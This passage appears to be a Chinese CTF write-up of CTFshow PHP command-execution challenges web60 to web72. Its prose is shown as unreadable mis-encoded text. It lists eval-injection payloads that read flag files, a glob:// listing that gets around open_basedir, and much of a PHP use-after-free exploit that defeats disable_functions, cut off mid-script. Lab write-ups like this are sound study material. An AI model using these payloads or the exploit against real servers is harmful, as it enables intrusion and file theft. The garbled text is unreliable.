class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿˜æ˜¯ç¦ç”¨å‡½æ•°ï¼Œä½†æ˜¯payloadè·Ÿä¸Šé¢˜ä¸€æ ·</p><p><code>paylaod: c=echo show_source(&quot;flag.php&quot;);</code></p><h1 id="web61"><a href="#web61" class="headerlink" title="web61()"></a>web61()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¦ç”¨å‡½æ•°ï¼Œï¼Œä¸Šé¢˜çš„payloadä¾æ—§èƒ½ç”¨</p><p><code>paylaod: c=echo show_source(&quot;flag.php&quot;);</code></p><h1 id="web62"><a href="#web62" class="headerlink" title="web62()"></a>web62()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payloadåŒä¸Š</p><p><code>paylaod: c=echo show_source(&quot;flag.php&quot;);</code></p><h1 id="web63"><a href="#web63" class="headerlink" title="web63()"></a>web63()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payloadåŒä¸Š</p><p><code>paylaod: c=echo show_source(&quot;flag.php&quot;);</code></p><h1 id="web64"><a href="#web64" class="headerlink" title="web64()"></a>web64()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payloadåŒä¸Š</p><p><code>paylaod: c=echo show_source(&quot;flag.php&quot;);</code></p><h1 id="web65"><a href="#web65" class="headerlink" title="web65()"></a>web65()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payloadåŒä¸Š</p><p><code>paylaod: c=echo show_source(&quot;flag.php&quot;);</code></p><h1 id="web66"><a href="#web66" class="headerlink" title="web66()"></a>web66()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŠŠ<code>show_source</code>ç¦æ‰äº†ï¼Œï¼Œå¯ä»¥ç”¨<code>highlight_file</code>æ›¿æ¢ï¼Œä½†æ˜¯è¿˜æ˜¯ä¸è¡Œ</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/66.png" alt=""></p><p>å¯ä»¥å‘ç°ä»£ç æ˜¯æ‰§è¡Œäº†çš„ï¼Œä½†æ˜¯flagä¸åœ¨è¿™é‡Œï¼Œåˆ©ç”¨<code>scandir()</code>é…åˆ<code>var_dump()</code>æŸ¥çœ‹ç›®å½•å†…å®¹</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/66_01.png" alt=""></p><p>åœ¨æ ¹ç›®å½•å‘ç°flagï¼Œç›´æ¥<code>highlight_file()</code>æŸ¥çœ‹å³å¯</p><p><code>paylaod: highlight_file(&#39;/flag.txt&#39;);</code></p><h1 id="web67"><a href="#web67" class="headerlink" title="web67()"></a>web67()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ“ä½œåŒä¸Š</p><p><code>paylaod: highlight_file(&#39;/flag.txt&#39;);</code></p><h1 id="web68"><a href="#web68" class="headerlink" title="web68()"></a>web68()</h1><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/68.png" alt=""></p><p>è¿™å›ç›´æ¥banæ‰äº†<code>highlight_file</code>ï¼Œå¯¼è‡´æºç éƒ½çœ‹ä¸åˆ°äº†</p><p>ä¸è¿‡æŒ‰ç…§ä¹‹å‰çš„å¥—è·¯ï¼Œä¾æ—§å¯ä»¥è¿›è¡Œpostä¼ å‚</p><p>å°è¯•<code>include</code>åŒ…å«æ–‡ä»¶</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/68_01.png" alt=""></p><p>æ–‡ä»¶å¤ªå¤§äº†ï¼Œå°è¯•è·Ÿä¸Šé¢˜ä¸€æ ·çš„å¥—è·¯ï¼Œè®¿é—®æ ¹ç›®å½•çš„flag.txt</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/68_03.png" alt=""></p><p>æˆåŠŸï¼</p><p><code>paylaod:include(&#39;/flag.txt&#39;);</code></p><h1 id="web69"><a href="#web69" class="headerlink" title="web69()"></a>web69()</h1><p>æ“ä½œåŒä¸Š</p><p><code>paylaod:include(&#39;/flag.txt&#39;);</code></p><h1 id="web70"><a href="#web70" class="headerlink" title="web70()"></a>web70()</h1><p>æ“ä½œåŒä¸Š</p><p><code>paylaod:include(&#39;/flag.txt&#39;);</code></p><h1 id="web71"><a href="#web71" class="headerlink" title="web71()"></a>web71()</h1><p>æœ¬é¢˜å‘ç°ä¹‹å‰çš„payloadä¸å¥½ä½¿äº†ï¼Œä½†æ˜¯å¯ä»¥ä¸‹è½½æºç çœ‹çœ‹</p><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤§æ¦‚æ„æ€å°±æ˜¯æŠŠæˆ‘ä»¬POSTçš„æ•°æ®åŒ…å«å­—æ¯æ•°å­—çš„å…¨éƒ¨æ›¿æ¢æˆ<code>?</code>äº†</p><p>å¾ˆæ˜æ˜¾è¿™æ˜¯ä¸€ä¸ªæ— æ•°å­—ã€æ— å­—æ¯çš„rce</p><p>ä½†æ˜¯ä»”ç»†çœ‹ä¼šå‘ç°ï¼Œåœ¨è¾“å‡ºä¹‹å‰ï¼Œä¼šæ‰§è¡Œæˆ‘è¾“å…¥çš„ä»£ç </p><p>æˆ‘ä»¬å¯ä»¥åœ¨æ‰§è¡Œä»£ç åç›´æ¥ç»ˆæ­¢ç¨‹åºï¼Œè¿™æ ·åé¢çš„ä»£ç å°±ä¸ä¼šæ‰§è¡Œäº†</p><p><code>payload: c=include(&quot;/flag.txt);exit();</code></p><h1 id="web72-disable-function"><a href="#web72-disable-function" class="headerlink" title="web72(disable_function())"></a>web72(disable_function())</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;display_errors&#x27;, 0);</span><br><span class="line">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æºç è·Ÿä¸Šé¢˜ä¸€æ ·ï¼Œä½†æ˜¯ä¸Šé¢˜çš„payloadä¸å¥½ä½¿äº†ï¼Œå› ä¸ºæ‰¾ä¸åˆ°æ–‡ä»¶</p><p>å°è¯•æ‰«ææ ¹ç›®å½•ï¼Œ<code>c=var_dump(scandir(&#39;/&#39;));exit();</code></p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/72.png" alt=""></p><p>å‘ç°<code>var_dump()</code>è¢«ç¦ç”¨äº†ï¼Œä¸”ç”¨<code>open_basedir</code>é™åˆ¶äº†è¯»å–ç›®å½•</p><p> å¯ä»¥åˆ©ç”¨<code>glob://</code>ä¼ªåè®®è¯»å–æ‰€æœ‰æ–‡æœ¬ä¿¡æ¯</p><blockquote><p><code>glob</code> ä¼ªåè®®æ˜¯ä¸€ç§ç”¨äºåœ¨URLä¸­è¿›è¡Œæ¨¡å¼åŒ¹é…å’Œæ–‡ä»¶æŸ¥æ‰¾çš„åè®®ã€‚å®ƒå¯ä»¥é€šè¿‡ä½¿ç”¨é€šé…ç¬¦æ¥åŒ¹é…æ–‡ä»¶ç³»ç»Ÿä¸­çš„å¤šä¸ªæ–‡ä»¶ï¼Œå¹¶å°†å®ƒä»¬ä½œä¸ºç»“æœè¿”å›ã€‚</p><p>ä½¿ç”¨ <code>glob</code> ä¼ªåè®®ï¼Œå¯ä»¥åœ¨æ”¯æŒè¯¥åè®®çš„åº”ç”¨ç¨‹åºæˆ–å·¥å…·ä¸­æ‰§è¡Œæ–‡ä»¶æˆ–ç›®å½•çš„æ¨¡å¼åŒ¹é…ã€‚ä¸€äº›å¸¸è§çš„åº”ç”¨åŒ…æ‹¬å‘½ä»¤è¡Œç»ˆç«¯ã€è„šæœ¬å’Œç¼–ç¨‹è¯­è¨€ä¸­çš„æ–‡ä»¶æŸ¥æ‰¾å‡½æ•°ã€‚</p><p>ä¾‹å¦‚ï¼š<code>glob:/path/to/directory/*.txt</code></p><p><code>/path/to/directory/</code> æ˜¯è¦æœç´¢çš„ç›®å½•è·¯å¾„ï¼Œè€Œ <code>*.txt</code> æ˜¯ä¸€ä¸ªé€šé…ç¬¦æ¨¡å¼ï¼Œç”¨äºåŒ¹é…è¯¥ç›®å½•ä¸­ä»¥ <code>.txt</code> ç»“å°¾çš„æ‰€æœ‰æ–‡ä»¶ã€‚</p></blockquote><p>æ‰€ä»¥å¯ä»¥æ„é€ ä»£ç æ¥è¯»å–æ–‡æœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="string">&quot;glob:///*.txt&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span>=<span class="title function_ invoke__">opendir</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">while</span>((<span class="variable">$file</span>=<span class="title function_ invoke__">readdir</span>(<span class="variable">$b</span>))!==<span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;filename:&quot;</span>.<span class="variable">$file</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">closedir</span>(<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/72_01.png" alt=""></p><p>å‘ç°æ”¹åäº†ï¼Œå°è¯•æ–‡ä»¶åŒ…å«è¯»å–æ–‡ä»¶å<code>c=include(&quot;flag0.txt&quot;);exit();</code></p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/72_02.png" alt=""></p><p>å‘ç°ä¸è¡Œï¼Œå°è¯•ç”¨ç½‘ä¸Šçš„ä¸€ä¸ªç»•è¿‡å®‰å…¨ç›®å½•çš„uafè„šæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> 